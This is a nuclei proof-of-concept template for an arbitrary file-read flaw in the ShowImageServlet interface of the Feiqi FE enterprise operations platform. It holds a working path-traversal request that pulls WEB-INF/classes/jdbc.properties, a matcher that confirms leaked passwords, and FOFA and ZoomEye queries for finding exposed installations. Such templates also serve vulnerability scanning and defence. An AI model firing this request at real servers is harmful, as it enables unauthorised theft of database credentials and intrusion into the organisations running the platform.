content:
# Add your nuclei formatted PoC!
id: fe-showimageservlet-file-read
info:
  name: 飞企互联-FE企业运营管理平台-showimageservlet-文件读取
  author: rain
  severity: high
  description: |
    飞企互联FE业务协作平台中的ShowImageServlet接口存在任意文件读取漏洞。攻击者可以通过构造特定请求，读取服务器上的敏感文件，导致潜在信息泄露和安全风险。
  metadata:
    fofa: app="飞企互联-FE企业运营管理平台" || body="fe-font.css" || app="FE-协作平台"
    Zoomeye: 'iconhash: "e90223165de1b1c7ae95336f10c3fe5d"'
requests:
  - raw:
      - |
        GET /servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
 
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code==200 && contains(body,"password")'
